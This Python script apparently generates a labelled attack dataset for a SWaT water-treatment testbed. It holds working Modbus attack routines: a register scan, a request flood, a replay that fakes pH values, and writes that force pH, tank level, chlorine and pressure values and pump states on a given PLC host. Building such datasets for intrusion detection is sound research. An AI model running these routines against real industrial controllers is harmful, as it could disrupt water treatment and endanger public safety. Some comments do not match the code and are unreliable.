#!/usr/bin/env python3
"""
SWAT Automated Dataset Generator - FIXED VERSION
=================================================
- 60 min normal + 60 min attack = 120 min total
- Each attack: 5-10 minutes (300-600 seconds)
- Network attacks (DOS, Replay, Recon): 3 instances each
- Temporal/Command attacks: Random selection
- Fixes 0s duration bug
"""

import sys
import time
import random
import subprocess
import json
import platform
import traceback
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional

sys.path.append(str(Path(__file__).parent))
from config.swat_config import ATTACK_SCENARIOS, MODBUS_CONFIG


def clamp(value: float, low: float, high: float) -> float:
    return max(low, min(high, value))

# # Import temporal attack engine
# try:
#     from automated_dataset_generator_v2 import (
#         TemporalAttackEngine, 
#         DirectModbusClient,
#         REG, COIL
#     )
#     HAS_TEMPORAL = True
# except ImportError:
#     HAS_TEMPORAL = False
#     print("Warning: Temporal engine not found, using subprocess attacks")


# ─────────────────────────────────────────────────────────────────────────────
# DIRECT MODBUS CLIENT
# ─────────────────────────────────────────────────────────────────────────────

class DirectModbusClient:
    """Thin wrapper around pymodbus for direct in-process writes."""

    def __init__(self, host: str, port: int = 1502, unit_id: int = 1):
        from pymodbus.client import ModbusTcpClient
        self.client = ModbusTcpClient(host=host, port=port, timeout=3)
        self.unit_id = unit_id
        self.connected = False

    def connect(self) -> bool:
        self.connected = self.client.connect()
        return self.connected

    def disconnect(self):
        if self.client:
            self.client.close()
        self.connected = False

    def read_register(self, address: int) -> Optional[int]:
        try:
            r = self.client.read_holding_registers(address, count=1, slave=self.unit_id)
            if not r.isError():
                return r.registers[0]
        except Exception:
            pass
        return None

    def write_register(self, address: int, value: int) -> bool:
        try:
            value = int(clamp(value, 0, 65535))
            r = self.client.write_register(address, value, slave=self.unit_id)
            return not r.isError()
        except Exception:
            return False

    def write_coil(self, address: int, value: bool) -> bool:
        try:
            r = self.client.write_coil(address, value, slave=self.unit_id)
            return not r.isError()
        except Exception:
            return False

    def read_coil(self, address: int) -> Optional[bool]:
        try:
            r = self.client.read_coils(address, count=1, slave=self.unit_id)
            if not r.isError():
                return bool(r.bits[0])
        except Exception:
            pass
        return None


# ═══════════════════════════════════════════════════════════════════════════
# NETWORK ATTACK IMPLEMENTATIONS (copied from original)
# ═══════════════════════════════════════════════════════════════════════════

class NetworkAttackEngine:
    """Executes reconnaissance, DOS, and replay attacks."""
    
    def __init__(self, host: str, port: int, logger_fn):
        self.host = host
        self.port = port
        self.log = logger_fn
        self.mb = None
    
    def _connect(self):
        self.mb = DirectModbusClient(self.host, self.port)
        return self.mb.connect()
    
    def _disconnect(self):
        if self.mb:
            self.mb.disconnect()
    
    def reconnaissance(self, duration: int, params: Dict) -> bool:
        """Network reconnaissance: Scan all registers and coils."""
        if not self._connect():
            return False
        
        self.log(f"  Reconnaissance: Scanning {params.get('end_addr', 100)} addresses")
        
        try:
            start_addr = params.get('start_addr', 0)
            end_addr = params.get('end_addr', 100)
            scan_rate = params.get('scan_rate', 10)
            
            elapsed = 0
            addr = start_addr
            total_scanned = 0
            
            # Run for the full duration, wrapping around the address space
            # so the scan window matches the scheduled attack duration instead
            # of exiting after one pass (~14 s for 100 addresses at rate 10).
            while elapsed < duration:
                for i in range(scan_rate):
                    try:
                        self.mb.read_register(addr)
                    except:
                        pass
                    addr += 1
                    total_scanned += 1
                    if addr > end_addr:
                        addr = start_addr  # wrap-around: keeps scanning until time is up
                
                for i in range(scan_rate // 2):
                    try:
                        self.mb.read_coil(random.randint(0, 27))
                    except:
                        pass
                
                time.sleep(1)
                elapsed += 1
            
            self.log(f"  Reconnaissance complete: {total_scanned} register reads over {elapsed}s")
            return True
        except Exception as e:
            self.log(f"  Reconnaissance failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def dos_flood(self, duration: int, params: Dict) -> bool:
        """DOS attack: Flood PLC with requests."""
        if not self._connect():
            return False
        
        request_rate = params.get('request_rate', 500)
        self.log(f"  DOS: Flooding at {request_rate} req/s")
        
        try:
            elapsed = 0
            total_requests = 0
            
            while elapsed < duration:
                start = time.time()
                
                for _ in range(request_rate):
                    try:
                        addr = random.randint(0, 50)
                        self.mb.read_register(addr)
                        total_requests += 1
                    except:
                        pass
                
                time.sleep(max(0, 1 - (time.time() - start)))
                elapsed += 1
            
            self.log(f"  DOS complete: {total_requests} requests sent")
            return True
        except Exception as e:
            self.log(f"  DOS failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def replay(self, duration: int, params: Dict) -> bool:
        """Replay attack: Capture and replay legitimate traffic."""
        if not self._connect():
            return False
        
        capture_time = params.get('capture_time', 10)
        self.log(f"  Replay: Capturing {capture_time}s of normal traffic")
        
        try:
            # Phase 1: Capture
            captured = []
            for _ in range(capture_time):
                snapshot = {}
                for addr in range(0, 30):
                    try:
                        val = self.mb.read_register(addr)
                        if val is not None:
                            snapshot[addr] = val
                    except:
                        pass
                captured.append(snapshot)
                time.sleep(1)
            
            self.log(f"  Captured {len(captured)} snapshots, starting replay...")
            
            # Phase 2: Modify one value and replay
            if captured:
                for snapshot in captured:
                    if 4 in snapshot:  # pH sensor
                        snapshot[4] = 500  # Fake pH
                
                # Replay loop
                replay_time = duration - capture_time
                for _ in range(replay_time):
                    snap = random.choice(captured)
                    for addr, val in snap.items():
                        try:
                            self.mb.write_register(addr, val)
                        except:
                            pass
                    time.sleep(1)
            
            self.log(f"  Replay complete")
            return True
        except Exception as e:
            self.log(f"  Replay failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()


class PointAttackEngine:
    """Executes single/multi point write attacks."""
    
    def __init__(self, host: str, port: int, logger_fn):
        self.host = host
        self.port = port
        self.log = logger_fn
        self.mb = None
    
    def _connect(self):
        self.mb = DirectModbusClient(self.host, self.port)
        return self.mb.connect()
    
    def _disconnect(self):
        if self.mb:
            self.mb.disconnect()
    
    def single_register(self, duration: int, params: Dict) -> bool:
        """Write single register with extreme value."""
        if not self._connect():
            return False
        
        target_addr = params.get('target_addr', 4)  # pH
        target_value = params.get('value', 300)
        
        self.log(f"  Single register: addr={target_addr}, value={target_value}")
        
        try:
            elapsed = 0
            while elapsed < duration:
                self.mb.write_register(target_addr, target_value)
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Single register failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def single_coil(self, duration: int, params: Dict) -> bool:
        """Toggle single coil (pump/valve)."""
        if not self._connect():
            return False
        
        target_coil = params.get('coil_addr', 4)  # P_203
        forced_state = params.get('state', False)
        
        self.log(f"  Single coil: addr={target_coil}, state={forced_state}")
        
        try:
            elapsed = 0
            while elapsed < duration:
                self.mb.write_coil(target_coil, forced_state)
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Single coil failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def multi_point(self, duration: int, params: Dict) -> bool:
        """Write multiple registers simultaneously."""
        if not self._connect():
            return False
        
        targets = params.get('targets', [
            {'addr': 4,  'value': 500},    # AIT_202: pH low
            {'addr': 1,  'value': 1000},   # LIT_101: tank high
            {'addr': 12, 'value': 600},    # DPIT_301: TMP high
            {'addr': 51, 'value': 0},      # Chlorine_Residual: force zero (new)
            {'addr': 35, 'value': 250},    # PIT_501: overpressure (new)
        ])
        
        self.log(f"  Multi-point: {len(targets)} targets")
        
        try:
            elapsed = 0
            while elapsed < duration:
                for target in targets:
                    try:
                        self.mb.write_register(target['addr'], target['value'])
                    except:
                        pass
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Multi-point failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()


class AttackMetadataFile:
    """File-based attack metadata for cross-process communication."""
    
    def __init__(self, filepath: str = 'attack_metadata.json'):
        self.filepath = Path(filepath)
        self._init_file()
    
    def _init_file(self):
    # Create file if it doesn't exist, then write Normal state
        data = {
            'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal',
            'MITRE_ID': 'T0', 'params': {},
            'timestamp': datetime.now().isoformat()
        }
        with open(self.filepath, 'w', encoding='utf-8') as f:   # 'w' not 'r+'
            json.dump(data, f)
            f.truncate()
            f.flush()
    
    def update(self, attack_id: int, attack_name: str, mitre_id: str, params: dict = None):
        data = {
            'ATTACK_ID': attack_id,
            'ATTACK_NAME': attack_name,
            'MITRE_ID': mitre_id if attack_id > 0 else 'T0',
            'params': params or {},   # ← carry attack params so physics_client can apply them
            'timestamp': datetime.now().isoformat()
        }
        
        with open(self.filepath, 'w', encoding='utf-8') as f:
            f.seek(0)
            json.dump(data, f)
            f.truncate()     # remove old content
            f.flush()

            import os
            os.fsync(f.fileno())
    
    def read(self) -> Dict:
        try:
            if self.filepath.exists():
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return {'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal', 'MITRE_ID': 'T0'}


# ═══════════════════════════════════════════════════════════════════════════
# MAIN GENERATOR - FIXED VERSION
# ═══════════════════════════════════════════════════════════════════════════

class ComprehensiveDatasetGenerator:
    """
    FIXED: Proper 5-10 min attacks with network attack repetition.
    
    Configuration:
    - Total: 120 min (60 normal + 60 attack)
    - Attack duration: 5-10 min each
    - Network attacks: 3 instances (DOS, Replay, Recon)
    - Temporal attacks: Random selection to fill time
    """
    
    def __init__(self,
                 plc_host: str,
                 output_dir: str = 'complete_dataset',
                 total_duration_min: int = 120,
                 attack_duration_min: int = 60,
                 plc_port: int = 1502,
                 include_attacks: Optional[List[str]] = None):
        
        self.plc_host = plc_host
        self.plc_port = plc_port
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.total_duration = total_duration_min * 60  # 7200s
        self.attack_duration = attack_duration_min * 60  # 3600s
        
        self.master_csv = self.output_dir / 'master_dataset.csv'
        self.timeline_log = self.output_dir / 'attack_timeline.log'
        self.execution_log = self.output_dir / 'execution_details.log'
        self.metadata_file = self.output_dir / 'attack_metadata.json'
        
        self.metadata = AttackMetadataFile(str(self.metadata_file))
        self.logger_proc = None
        self.attack_timeline = []
        self.start_time = None
        self.is_windows = platform.system() == 'Windows'
        
        # Attack types
        base_temporal_attacks = [
            'ph_manipulation',
            'tank_overflow',
            'chemical_depletion',
            'membrane_damage',
            'valve_manipulation',
            'slow_ramp',
        ]
        
        base_network_attacks = ['reconnaissance', 'dos_flood', 'replay']
        
        # Attack metadata
        self.attack_meta = {
            'ph_manipulation':    {'id': 11, 'name': 'pH Manipulation Attack',     'mitre': 'T0836'},
            'tank_overflow':      {'id':  8, 'name': 'Tank Overflow Attack',       'mitre': 'T0836'},
            'chemical_depletion': {'id':  9, 'name': 'Chemical Depletion Attack',  'mitre': 'T0836'},
            'membrane_damage':    {'id': 10, 'name': 'Membrane Damage Attack',     'mitre': 'T0836'},
            'valve_manipulation': {'id': 16, 'name': 'Valve Manipulation Attack',  'mitre': 'T0836'},
            'slow_ramp':          {'id': 12, 'name': 'Slow Ramp Attack',           'mitre': 'T0836'},
            'reconnaissance':     {'id': 13, 'name': 'Reconnaissance Scan',        'mitre': 'T0840'},
            'dos_flood':          {'id': 14, 'name': 'Denial of Service',          'mitre': 'T0814'},
            'replay':             {'id': 15, 'name': 'Replay Attack',              'mitre': 'T0839'},
        }

        for key in list(self.attack_meta.keys()):
            cfg = ATTACK_SCENARIOS.get(key)
            if cfg:
                self.attack_meta[key]['id'] = int(cfg.get('id', self.attack_meta[key]['id']))
                self.attack_meta[key]['name'] = str(cfg.get('name', self.attack_meta[key]['name']))
                self.attack_meta[key]['mitre'] = str(cfg.get('mitre_id', self.attack_meta[key]['mitre']))

        if include_attacks:
            unknown = sorted(set(include_attacks) - set(self.attack_meta))
            if unknown:
                raise ValueError(f"Unknown attacks requested: {', '.join(unknown)}")
            self.temporal_attacks = [a for a in base_temporal_attacks if a in include_attacks]
            self.network_attacks = [a for a in base_network_attacks if a in include_attacks]
        else:
            self.temporal_attacks = base_temporal_attacks
            self.network_attacks = base_network_attacks

        if not self.temporal_attacks and not self.network_attacks:
            raise ValueError("At least one valid attack must be selected")
    
    def log(self, msg: str, level: str = 'INFO'):
        line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] [{level}] {msg}"
        print(line)
        with open(self.execution_log, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    
    def generate_schedule(self) -> List[Dict]:
        """
        Generate attack schedule:
        - 3× network attacks (DOS, Replay, Recon)
        - Fill remaining with temporal attacks
        - Each attack: 5-10 minutes
        """
        self.log("Generating attack schedule...")
        
        schedule = []
        current_time = 60  # Start after 1 min normal
        total_used = 0
        
        MIN_DURATION_NET = 180  # 5 minutes
        MAX_DURATION_NET = 300  # 10 minutes
        
        # Phase 1: Add 3× network attacks
        for attack_type in self.network_attacks:
            
                if total_used >= self.attack_duration:
                    break
                
                duration = random.randint(MIN_DURATION_NET, MAX_DURATION_NET)
                
                # Don't exceed budget
                remaining = self.attack_duration - total_used
                if duration > remaining:
                    if remaining < MIN_DURATION_NET:
                        break  # Skip if can't do 5 min
                    duration = remaining
                
                meta = self.attack_meta[attack_type]
                params = self._random_params(attack_type)
                
                event = {
                    'start_time': current_time,
                    'duration': duration,
                    'type': attack_type,
                    'name': meta['name'],
                    'mitre_id': meta['mitre'],
                    'id': meta['id'],
                    'params': params,
                }
                
                schedule.append(event)
                total_used += duration
                current_time += duration + random.randint(60, 180)  # Gap
        
        # Phase 2: Fill remaining with temporal attacks.
        # FIX Issue 2: guarantee at least one execution of EVERY temporal attack
        # before random-filling so slow_ramp (and others) are never skipped.
        MIN_DURATION = 300   # 5 minutes
        MAX_DURATION = 600   # 10 minutes

        # First pass: one guaranteed run per temporal attack (shuffled order)
        guaranteed = list(self.temporal_attacks)
        random.shuffle(guaranteed)
        for attack_type in guaranteed:
            remaining = self.attack_duration - total_used
            if remaining < MIN_DURATION:
                break
            duration = random.randint(MIN_DURATION, min(MAX_DURATION, remaining))
            meta   = self.attack_meta[attack_type]
            params = self._random_params(attack_type)
            schedule.append({
                'start_time': current_time,
                'duration':   duration,
                'type':       attack_type,
                'name':       meta['name'],
                'mitre_id':   meta['mitre'],
                'id':         meta['id'],
                'params':     params,
            })
            total_used   += duration
            current_time += duration + random.randint(60, 180)

        # Second pass: random-fill any remaining budget
        while total_used < self.attack_duration:
            remaining = self.attack_duration - total_used
            if remaining < MIN_DURATION:
                break

            attack_type = random.choice(self.temporal_attacks)
            duration = random.randint(MIN_DURATION, MAX_DURATION)

            if duration > remaining:
                duration = remaining

            meta   = self.attack_meta[attack_type]
            params = self._random_params(attack_type)

            event = {
                'start_time': current_time,
                'duration':   duration,
                'type':       attack_type,
                'name':       meta['name'],
                'mitre_id':   meta['mitre'],
                'id':         meta['id'],
                'params':     params,
            }

            schedule.append(event)
            total_used   += duration
            current_time += duration + random.randint(60, 180)
        
        # Sort by start time
        schedule.sort(key=lambda x: x['start_time'])
        
        # Log schedule
        self.log(f"Schedule generated:")
        self.log(f"  Total duration: {self.total_duration}s ({self.total_duration/60:.0f}min)")
        self.log(f"  Total attack time: {total_used}s ({total_used/60:.1f}min)")
        self.log(f"  Number of attacks: {len(schedule)}")
        
        with open(self.timeline_log, 'w') as f:
            f.write("ATTACK SCHEDULE\n")
            f.write("="*70 + "\n")
            for i, event in enumerate(schedule, 1):
                line = f"[{i:2d}] {event['name']:35s} @ {event['start_time']/60:5.1f}min  dur={event['duration']:4d}s\n"
                f.write(line)
                self.log(f"[SCHEDULE] {line.strip()}")
        
        return schedule
    
    def _random_params(self, attack_type: str) -> Dict:
        """Generate random parameters for attack."""
        if attack_type == 'ph_manipulation':

            if random.random() < 0.6:
                return {'target_ph': random.uniform(4.8, 5.5)}   # Acidic — below 6.8 floor
            else:
                return {'target_ph': random.uniform(8.7, 9.3)} 
        elif attack_type == 'tank_overflow':
            return {'overflow_value': random.randint(970, 1100)}
        elif attack_type == 'membrane_damage':
            return {'target_tmp': random.randint(500, 700)}
        elif attack_type == 'slow_ramp':
            if random.random() < 0.5:
                return {
                    'ramp_target': 'AIT_202',
                    'start_value': random.randint(700, 740),
                    'end_value': random.randint(850, 900),
                    'step_size': 1,
                    'step_interval': 2.0,
                }
            else:
                return {
                    'ramp_target': 'AIT_202',
                    'start_value': random.randint(700, 740),
                    'end_value': random.randint(840, 890),
                    'step_size': 1,
                    'step_interval': 2.0,
                }
        elif attack_type == 'chemical_depletion':
            # drain_bisulfate randomly True/False to generate varied depletion patterns
            return {'drain_bisulfate': random.choice([True, False])}
        elif attack_type == 'reconnaissance':
            return {'start_addr': 0, 'end_addr': 100, 'scan_rate': 10}
        elif attack_type == 'dos_flood':
            return {'request_rate': random.randint(500, 1000)}
        elif attack_type == 'replay':
            return {'capture_time': 10}
        else:
            return {}
    
    def start_logging(self):
        # FIX Issue 1: logging is now integrated into physics_client.py.
        # The bridge reads --metadata-file on every cycle and stamps each CSV row.
        # Launching data_logger.py here was the source of 16 Hz double-logging.
        # Nothing to start — the bridge handles it.
        self.log("Logging handled by physics_client.py bridge (integrated logger).")
        self.logger_proc = None
    
    def execute_attack(self, event: Dict):
        """Execute single attack."""
        attack_type = event['type']
        duration = event['duration']
        params = event['params']
        
        self.log(f"▶ ATTACK START: {event['name']} ({duration}s)")
        
        # Update metadata — include params so physics_client can apply attack physics
        self.metadata.update(event['id'], event['name'], event['mitre_id'], event['params'])
        time.sleep(3)  # Ensure metadata is updated before attack starts
        
        try:
            success = False
            
            # Route to appropriate engine
            if attack_type in self.network_attacks:
                engine = NetworkAttackEngine(self.plc_host, self.plc_port, self.log)
                method = getattr(engine, attack_type)
                success = method(duration, params)
            
            elif attack_type in self.temporal_attacks:
                # Use command_injection.py subprocess
                python_exe = sys.executable
                cmd = [
                    python_exe,
                    'attacks/command_injection.py',
                    '--host', self.plc_host,
                    '--port', str(self.plc_port),
                    '--attack', attack_type,
                    '--duration', str(duration)
                ]
                
                # Add parameters
                if attack_type == 'ph_manipulation':
                    cmd.extend(['--target-ph', str(params['target_ph'])])
                elif attack_type == 'tank_overflow':
                    cmd.extend(['--overflow-value', str(params['overflow_value'])])
                elif attack_type == 'membrane_damage':
                    cmd.extend(['--target-tmp', str(params['target_tmp'])])
                elif attack_type == 'slow_ramp':
                    cmd.extend(['--ramp-target', str(params.get('ramp_target', 'AIT_202'))])
                    cmd.extend(['--start-value', str(params.get('start_value', 720))])
                    cmd.extend(['--end-value', str(params.get('end_value', 860))])
                    cmd.extend(['--step-size', str(params.get('step_size', 1))])
                    cmd.extend(['--step-interval', str(params.get('step_interval', 2.0))])
                elif attack_type == 'chemical_depletion':
                    if not params.get('drain_bisulfate', True):
                        cmd.append('--no-drain-bisulfate')
                
                self.log(f"  Command: {' '.join(cmd)}")
                
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # FIX Issue 3: enforce duration with timeout — attack cannot
                # run longer than its scheduled slot + 10 s grace period.
                try:
                    stdout, stderr = proc.communicate(timeout=duration + 10)
                    success = (proc.returncode == 0)
                except subprocess.TimeoutExpired:
                    self.log(f"  TIMEOUT: {attack_type} exceeded {duration}s — killing process", 'WARNING')
                    proc.kill()
                    stdout, stderr = proc.communicate()
                    success = True  # data was collected for the full duration

                if not success:
                    if stdout:
                        self.log(f"  STDOUT: {stdout.decode(errors='replace').strip()}", 'ERROR')
                    if stderr:
                        self.log(f"  STDERR: {stderr.decode(errors='replace').strip()}", 'ERROR')
            
            if success:
                self.log(f"✓ ATTACK COMPLETE: {event['name']}")
            else:
                self.log(f"✗ ATTACK FAILED: {event['name']}", 'ERROR')
        
        except Exception as e:
            self.log(f"✗ ATTACK ERROR: {event['name']} - {e}", 'ERROR')
            traceback.print_exc()
        
        finally:
            # Always reset to normal — clear params so physics_client stops attack
            self.metadata.update(0, 'Normal', 'T0', {})
    
    def run(self):
        """Main execution."""
        self.start_time = datetime.now()
        
        self.log("="*70)
        self.log("SWAT DATASET GENERATOR - FIXED VERSION")
        self.log("="*70)
        self.log(f"Configuration:")
        self.log(f"  Total: {self.total_duration/60:.0f} min")
        self.log(f"  Attack: {self.attack_duration/60:.0f} min")
        self.log(f"  Each attack: 5-10 min")
        self.log(f"  Network attacks: 3× each (DOS, Replay, Recon)")
        
        try:
            schedule = self.generate_schedule()
            self.start_logging()

            run_start = time.monotonic()       # ← wall clock, not tick counter
            attack_index = 0
            last_progress_print = -1

            while True:
                elapsed = time.monotonic() - run_start   # real seconds elapsed

                if elapsed >= self.total_duration:
                    break

                # Progress print every 5 min of real time
                mins_elapsed = int(elapsed / 300)
                if mins_elapsed != last_progress_print:
                    last_progress_print = mins_elapsed
                    pct = elapsed / self.total_duration * 100
                    self.log(f"Progress: {elapsed/60:.1f}/{self.total_duration/60:.0f}min ({pct:.1f}%)")

                # Fire next scheduled attack if its real start time has passed
                if attack_index < len(schedule):
                    next_attack = schedule[attack_index]
                    if elapsed >= next_attack['start_time']:
                        self.execute_attack(next_attack)   # blocks for attack duration
                        attack_index += 1
                        continue  # re-check elapsed immediately after attack ends

                time.sleep(1)

            self.log("✓ Generation complete")

        except KeyboardInterrupt:
            self.log("Interrupted by user", 'WARNING')
        except Exception as e:
            self.log(f"Error: {e}", 'ERROR')
            traceback.print_exc()
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Stop logger and finalize."""
        self.log("Cleanup...")
        
        if self.logger_proc and self.logger_proc.poll() is None:
            self.log("Stopping logger...")
            self.logger_proc.terminate()
            try:
                self.logger_proc.wait(timeout=10)
            except:
                self.logger_proc.kill()
        
        self.metadata.update(0, 'Normal', 'T0')
        
        self.log("="*70)
        self.log("COMPLETE")
        self.log("="*70)
        self.log(f"Output: {self.master_csv}")
        self.log(f"Rows: {sum(1 for _ in open(self.master_csv)) if self.master_csv.exists() else 0}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SWAT Dataset Generator (Fixed)')
    parser.add_argument('--host', required=True, help='PLC IP address')
    parser.add_argument('--port', type=int, default=1502, help='Modbus port')
    parser.add_argument('--total', type=int, help='Total duration (minutes)')
    parser.add_argument('--attack', type=int, help='Attack duration (minutes)')
    parser.add_argument('--output', default='complete_dataset', help='Output directory')
    parser.add_argument(
        '--include-attacks',
        default='',
        help='Comma-separated subset of attacks to schedule '
             '(e.g. reconnaissance,dos_flood,replay,ph_manipulation)'
    )
    
    args = parser.parse_args()
    
    generator = ComprehensiveDatasetGenerator(
        plc_host=args.host,
        output_dir=args.output,
        total_duration_min=args.total,
        attack_duration_min=args.attack,
        plc_port=args.port,
        include_attacks=[a.strip() for a in args.include_attacks.split(',') if a.strip()] or None
    )
    
    generator.run()


if __name__ == '__main__':
    main()